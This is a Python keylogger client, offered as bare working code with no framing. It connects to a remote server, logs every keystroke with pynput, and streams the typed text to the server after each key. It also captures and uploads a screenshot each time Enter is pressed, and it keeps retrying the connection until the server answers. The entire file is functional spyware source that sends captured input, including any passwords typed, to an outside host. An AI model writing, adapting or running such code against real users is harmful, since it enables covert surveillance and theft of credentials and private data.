import socket
import time
from pynput import keyboard
import pyautogui
import io

# Configuration
SERVER_IP = '192.168.228.128'
SERVER_PORT = 9999

s = None
typed_text = []

# Connect to server
def connect_to_server():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, SERVER_PORT))
            print("[*] Connected to server.")
            return sock
        except socket.error:
            print("[!] Server not available, retrying in 5 seconds...")
            time.sleep(5)

# Take and send screenshot
def take_screenshot():
    global s
    try:
        screenshot = pyautogui.screenshot()
        byte_img = io.BytesIO()
        screenshot.save(byte_img, format='PNG')
        img_data = byte_img.getvalue()
        s.sendall(b'SCREENSHOT'.ljust(10))
        s.sendall(str(len(img_data)).encode().ljust(16))
        s.sendall(img_data)
    except Exception as e:
        print(f"[!] Screenshot error: {e}")

# Send updated text to server
def send_buffer():
    global typed_text, s
    try:
        full_text = ''.join(typed_text)
        s.sendall(b'KEYLOG'.ljust(10))
        s.sendall(str(len(full_text)).encode().ljust(16))
        s.sendall(full_text.encode())
    except Exception as e:
        print(f"[!] Send error: {e}")

# Handle key press
def on_press(key):
    global typed_text

    try:
        if hasattr(key, 'char') and key.char:
            typed_text.append(key.char)
        elif key == keyboard.Key.space:
            typed_text.append(' ')
        elif key == keyboard.Key.enter:
            typed_text.append('\n')
            take_screenshot()
        elif key == keyboard.Key.backspace:
            if typed_text:
                typed_text.pop()
        elif key == keyboard.Key.tab:
            typed_text.append('\t')
        else:
            typed_text.append(f'[{key.name}]')

        send_buffer()

        # Stop if "stop" is typed
        if ''.join(typed_text[-4:]).lower() == "stop":
            print("[*] 'stop' detected. Exiting.")
            return False

    except Exception as e:
        print("[!] Key processing error:", e)

# Main
s = connect_to_server()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
